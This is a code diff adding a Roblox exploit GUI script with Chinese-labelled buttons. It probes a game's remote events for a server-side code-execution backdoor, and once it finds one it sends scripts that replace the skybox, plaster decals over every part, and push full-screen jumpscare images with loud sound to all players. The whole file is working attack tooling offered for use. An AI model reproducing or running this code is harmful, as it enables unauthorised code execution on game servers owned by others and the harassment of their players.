@@ -1,0 +1,499 @@
+-- Services
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local JointsService = game:GetService("JointsService")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+
+-- UI Creation
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DraggableUI"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0.5, 0, 0.9, 0)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.BackgroundTransparency = 1
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local blackBackground = Instance.new("Frame")
+blackBackground.Name = "BlackBackground"
+blackBackground.Size = UDim2.new(1, 0, 1, 0)
+blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+blackBackground.BorderSizePixel = 0
+blackBackground.Parent = mainFrame
+
+local imageContainer = Instance.new("Frame")
+imageContainer.Name = "ImageContainer"
+imageContainer.Size = UDim2.new(0.98, 0, 0.98, 0)
+imageContainer.Position = UDim2.new(0.01, 0, 0.01, 0)
+imageContainer.BackgroundTransparency = 1
+imageContainer.Parent = blackBackground
+
+local backgroundImage = Instance.new("ImageLabel")
+backgroundImage.Name = "BackgroundImage"
+backgroundImage.Size = UDim2.new(1, 0, 1, 0)
+backgroundImage.Image = "rbxassetid://97925433444604"
+backgroundImage.BackgroundTransparency = 1
+backgroundImage.ScaleType = Enum.ScaleType.Fit
+backgroundImage.Parent = imageContainer
+
+local titleText = Instance.new("TextLabel")
+titleText.Name = "TitleText"
+titleText.Size = UDim2.new(1, 0, 0.08, 0)
+titleText.Position = UDim2.new(0, 0, 0.02, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "TUP9362Gui"
+titleText.TextColor3 = Color3.new(1, 1, 1)
+titleText.TextScaled = true
+titleText.Font = Enum.Font.SourceSansBold
+titleText.Parent = mainFrame
+titleText.ZIndex = 2
+
+local whiteLine = Instance.new("Frame")
+whiteLine.Name = "WhiteLine"
+whiteLine.Size = UDim2.new(0.9, 0, 0, 1)
+whiteLine.Position = UDim2.new(0.05, 0, 0.11, 0)
+whiteLine.BackgroundColor3 = Color3.new(1, 1, 1)
+whiteLine.BorderSizePixel = 0
+whiteLine.Parent = mainFrame
+whiteLine.ZIndex = 2
+
+local buttonContainer = Instance.new("Frame")
+buttonContainer.Name = "ButtonContainer"
+buttonContainer.Size = UDim2.new(1, 0, 0.1, 0)
+buttonContainer.Position = UDim2.new(0, 0, 0.12, 0)
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.Parent = mainFrame
+buttonContainer.ZIndex = 2
+
+-- Buttons Configuration
+local buttonTitles = {"检测", "天空", "所有物体贴图", "跳脸1", "跳脸2"}
+local buttons = {}
+local buttonSettings = {
+    widthRatio = 0.25,
+    heightRatio = 1.2,
+    startX = 0.025,
+    spacing = 0.0625,
+    yPosition = 0.15,
+}
+
+local totalButtonWidth = buttonSettings.widthRatio * 3
+local totalSpacingWidth = buttonSettings.spacing * 2
+local totalWidth = totalButtonWidth + totalSpacingWidth
+local calculatedStartX = (1 - totalWidth) / 2
+
+-- 跳脸图片ID列表
+local JUMPSCARE_IMAGE_IDS = {
+    "109220693361739",  -- 跳脸1
+    "137570743023119"   -- 跳脸2
+}
+
+for i = 1, 3 do
+    local button = Instance.new("TextButton")
+    button.Name = "Button" .. i
+    button.Size = UDim2.new(buttonSettings.widthRatio, 0, buttonSettings.heightRatio, 0)
+    button.Position = UDim2.new(calculatedStartX + (i-1) * (buttonSettings.widthRatio + buttonSettings.spacing), 0, buttonSettings.yPosition, 0)
+    button.BackgroundColor3 = Color3.new(0, 0, 0)
+    button.BorderColor3 = Color3.new(1, 1, 1)
+    button.BorderSizePixel = 2
+    button.Text = buttonTitles[i]
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextScaled = true
+    button.Parent = buttonContainer
+    button.ZIndex = 3
+    buttons[i] = button
+end
+
+-- 在检测和天空按钮下方7像素处添加两个新按钮
+local newButtons = {}
+local newButtonTitles = {"跳脸1", "跳脸2"}
+local pixelOffset = 20 -- 像素偏移量
+
+-- 计算7像素相对于buttonContainer高度的比例
+local containerHeight = buttonContainer.AbsoluteSize.Y
+local pixelOffsetRatio = pixelOffset / containerHeight
+
+-- 计算新按钮的Y位置（原按钮Y位置 + 原按钮高度 + 7像素）
+local newButtonY = buttonSettings.yPosition + buttonSettings.heightRatio + pixelOffsetRatio
+
+-- 在检测按钮下方添加第一个新按钮
+local newButton1 = Instance.new("TextButton")
+newButton1.Name = "Button4"
+newButton1.Size = UDim2.new(buttonSettings.widthRatio, 0, buttonSettings.heightRatio, 0)
+newButton1.Position = UDim2.new(calculatedStartX, 0, newButtonY, 0) -- 与检测按钮对齐
+newButton1.BackgroundColor3 = Color3.new(0, 0, 0)
+newButton1.BorderColor3 = Color3.new(1, 1, 1)
+newButton1.BorderSizePixel = 2
+newButton1.Text = newButtonTitles[1]
+newButton1.TextColor3 = Color3.new(1, 1, 1)
+newButton1.TextScaled = true
+newButton1.Parent = buttonContainer
+newButton1.ZIndex = 3
+buttons[4] = newButton1
+newButtons[1] = newButton1
+
+-- 在天空按钮下方添加第二个新按钮
+local newButton2 = Instance.new("TextButton")
+newButton2.Name = "Button5"
+newButton2.Size = UDim2.new(buttonSettings.widthRatio, 0, buttonSettings.heightRatio, 0)
+newButton2.Position = UDim2.new(calculatedStartX + (buttonSettings.widthRatio + buttonSettings.spacing), 0, newButtonY, 0) -- 与天空按钮对齐
+newButton2.BackgroundColor3 = Color3.new(0, 0, 0)
+newButton2.BorderColor3 = Color3.new(1, 1, 1)
+newButton2.BorderSizePixel = 2
+newButton2.Text = newButtonTitles[2]
+newButton2.TextColor3 = Color3.new(1, 1, 1)
+newButton2.TextScaled = true
+newButton2.Parent = buttonContainer
+newButton2.ZIndex = 3
+buttons[5] = newButton2
+newButtons[2] = newButton2
+
+-- Backdoor Detection System
+local dateTimeNow = DateTime.now
+local tableFind = table.find
+local taskSpawn = task.spawn
+local taskWait = task.wait
+local mathRandom = math.random
+
+local attached = false
+local backdoor = nil
+local commonPlaces = {ReplicatedStorage, Workspace, Lighting}
+local remoteCodes = {}
+local STRING_VALUE_NAME = mathRandom(1000000, 9999999)
+local RobloxGui = CoreGui.RobloxGui
+
+-- Notification system
+local function notify(text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Backdoor Detector",
+        Duration = 3,
+        Text = text
+    })
+end
+
+-- Validate remote object
+local function validRemote(rm)
+    local Parent = rm.Parent
+    local class = rm.ClassName
+    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end
+    
+    if Parent then
+        if Parent == JointsService then return false end
+        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+           (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+    end
+    
+    if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+    
+    return true
+end
+
+-- Scan for backdoors in descendants
+local function scanDescendants(parent)
+    local descendance = parent:GetDescendants()
+    for i = 1, #descendance do
+        local descendant = descendance[i]
+        
+        if not validRemote(descendant) then continue end
+        
+        local remoteCode = tostring(mathRandom(100000, 999999))
+        remoteCodes[remoteCode] = descendant
+        
+        local remoteClass = descendant.ClassName
+        local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
+        
+        if remoteClass == "RemoteEvent" then
+            descendant:FireServer(requireScript)
+        elseif remoteClass == "RemoteFunction" then
+            local waiting = true
+            taskSpawn(function()
+                descendant:InvokeServer(requireScript)
+                waiting = nil
+            end)
+            
+            local start = dateTimeNow().UnixTimestampMillis
+            while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+                taskWait()
+            end
+        end
+        
+        if Workspace:FindFirstChild(STRING_VALUE_NAME) then
+            attached = true
+            backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
+            backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
+            return true
+        end
+    end
+end
+
+-- Play detection sound effect
+local function playDetectSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://9114937214" -- 检测成功音效
+    sound.Volume = 0.5
+    sound.Parent = screenGui
+    sound:Play()
+    task.wait(2)
+    sound:Destroy()
+end
+
+-- Main detection function
+local function scanGame()
+    local found = false
+    
+    -- Scan common locations first
+    for i = 1, #commonPlaces do
+        local place = commonPlaces[i]
+        if scanDescendants(place) then
+            found = true
+            break
+        end
+    end
+    
+    -- Scan entire game if not found
+    if not found then
+        local children = game:GetChildren()
+        for i = 1, #children do
+            local child = children[i]
+            if tableFind(commonPlaces, child) then continue end
+            
+            if scanDescendants(child) then
+                found = true
+                break
+            end
+        end
+    end
+    
+    -- Notification and sound
+    if found then
+        notify("✅ Backdoor Found!")
+        playDetectSound()
+    else
+        notify("❌ No backdoor detected!")
+    end
+    
+    return found
+end
+
+-- 修改天空盒的函数
+local function executeSkyboxScript()
+    if not attached or not backdoor then
+        notify("❌ 请先检测后门！")
+        return
+    end
+    
+    local skyboxScript = [[
+        local Lighting = game:GetService("Lighting")
+        
+        if Lighting:FindFirstChild("Sky") then
+            Lighting.Sky:Destroy()
+        end
+        
+        local newSky = Instance.new("Sky")
+        newSky.Name = "Sky"
+        newSky.Parent = Lighting
+        
+        local imageId = "97925433444604"
+        
+        newSky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. imageId
+        newSky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. imageId
+        newSky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. imageId
+        newSky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. imageId
+        newSky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. imageId
+        newSky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. imageId
+    ]]
+    
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(skyboxScript)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(skyboxScript)
+    end
+    
+    notify("✅ 天空盒已修改！")
+end
+
+-- 所有物体贴图的函数
+local function executeDecalScript()
+    if not attached or not backdoor then
+        notify("❌ 请先检测后门！")
+        return
+    end
+    
+    local decalScript = [[
+        local decalTexture = "http://www.roblox.com/asset/?id=97925433444604"
+        local workspace = game:GetService("Workspace")
+        
+        for _, descendant in pairs(workspace:GetDescendants()) do
+            if descendant:IsA("Part") or descendant:IsA("UnionOperation") then
+                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                    local decal = Instance.new("Decal")
+                    decal.Face = face
+                    decal.Texture = decalTexture
+                    decal.ZIndex = 99
+                    decal.Parent = descendant
+                end
+            end
+        end
+        
+        workspace.DescendantAdded:Connect(function(descendant)
+            wait(0.1)
+            if descendant:IsA("Part") or descendant:IsA("UnionOperation") then
+                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                    local decal = Instance.new("Decal")
+                    decal.Face = face
+                    decal.Texture = decalTexture
+                    decal.ZIndex = 99
+                    decal.Parent = descendant
+                end
+            end
+        end)
+    ]]
+    
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(decalScript)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(decalScript)
+    end
+    
+    notify("✅ 所有物体贴图已应用！")
+end
+
+-- 跳脸功能函数
+local function executeJumpScare(imageId)
+    if not attached or not backdoor then
+        notify("❌ 请先检测后门！")
+        return
+    end
+    
+    local jumpScareScript = string.format([[
+        local Players = game:GetService("Players")
+        local SoundService = game:GetService("SoundService")
+        
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player:FindFirstChild("PlayerGui") then
+                local ScreenGui = Instance.new("ScreenGui")
+                local ImageLabel = Instance.new("ImageLabel")
+                
+                ScreenGui.Parent = player.PlayerGui
+                ScreenGui.IgnoreGuiInset = true
+                ScreenGui.Name = "JumpScare"
+                ScreenGui.ResetOnSpawn = false
+                
+                ImageLabel.Parent = ScreenGui
+                ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+                ImageLabel.Image = "http://www.roblox.com/asset/?id=%s"
+                ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+                ImageLabel.BackgroundTransparency = 0
+                ImageLabel.ScaleType = Enum.ScaleType.Fit
+                
+                local sound = Instance.new("Sound", ScreenGui)
+                sound.SoundId = "rbxassetid://6018028320"
+                sound.Volume = 10
+                sound.Looped = false
+                
+                sound.Ended:Connect(function()
+                    ScreenGui:Destroy()
+                end)
+                
+                sound:Play()
+                
+                delay(30, function()
+                    if ScreenGui and ScreenGui.Parent then
+                        ScreenGui:Destroy()
+                    end
+                end)
+            end
+        end
+    ]], imageId)
+    
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(jumpScareScript)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(jumpScareScript)
+    end
+    
+    notify(string.format("✅ 跳脸已执行 (图片ID: %s)", imageId))
+end
+
+-- 自动检测并执行天空盒修改函数
+local function autoDetectAndExecuteSkybox()
+    if not attached or not backdoor then
+        if scanGame() then
+            task.wait(0.5)
+            executeSkyboxScript()
+        else
+            notify("❌ 未找到后门，无法修改天空盒！")
+        end
+    else
+        executeSkyboxScript()
+    end
+end
+
+-- 自动检测并执行所有物体贴图函数
+local function autoDetectAndExecuteDecals()
+    if not attached or not backdoor then
+        if scanGame() then
+            task.wait(0.5)
+            executeDecalScript()
+        else
+            notify("❌ 未找到后门，无法应用贴图！")
+        end
+    else
+        executeDecalScript()
+    end
+end
+
+-- 自动检测并执行跳脸函数
+local function autoDetectAndExecuteJumpScare(imageId)
+    if not attached or not backdoor then
+        if scanGame() then
+            task.wait(0.5)
+            executeJumpScare(imageId)
+        else
+            notify("❌ 未找到后门，无法执行跳脸！")
+        end
+    else
+        executeJumpScare(imageId)
+    end
+end
+
+-- Button 1: Backdoor Detection
+buttons[1].MouseButton1Click:Connect(function()
+    attached = false
+    backdoor = nil
+    remoteCodes = {}
+    STRING_VALUE_NAME = mathRandom(1000000, 9999999)
+    
+    scanGame()
+end)
+
+-- Button 2: Skybox Change
+buttons[2].MouseButton1Click:Connect(function()
+    autoDetectAndExecuteSkybox()
+end)
+
+-- Button 3: 所有物体贴图
+buttons[3].MouseButton1Click:Connect(function()
+    autoDetectAndExecuteDecals()
+end)
+
+-- 新按钮的事件处理
+newButtons[1].MouseButton1Click:Connect(function()
+    autoDetectAndExecuteJumpScare(JUMPSCARE_IMAGE_IDS[1])
+end)
+
+newButtons[2].MouseButton1Click:Connect(function()
+    autoDetectAndExecuteJumpScare(JUMPSCARE_IMAGE_IDS[2])
+end)
